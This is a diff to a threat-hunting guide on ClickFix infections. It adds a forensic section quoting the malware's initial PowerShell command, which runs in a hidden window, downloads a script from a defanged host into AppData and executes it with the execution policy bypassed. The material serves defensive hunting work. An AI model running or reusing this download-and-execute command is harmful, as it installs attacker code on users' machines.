@@ -126,3 +126,17 @@ DeviceRegistryEvents
 
 # Bonus: Forensic Hunting
 This chapter uses the [triage query](#clickfix-triage) as starting point and uncovers the post-compromise activities based on this infection. 
+
+As starting point the [incident](https://security.microsoft.com/incident2/126/) in security.microsoft.com can be used.
+
+
+**Initial infection**
+
+```PowerShell
+powershell -w h -nop -c "$s=Join-Path $env:APPDATA 'djw\6kn9.ps1';md (Split-Path $s) -ea 0;$l='hxxps://cbtechnic[.]com/0.wav';iwr $l -OutFile $s;& powershell -w h -ep Bypass -f $s"
+```
+
+**Stage 1**
+```
+C:\Users\level1\AppData\Roaming\djw\6kn9.ps1
+```
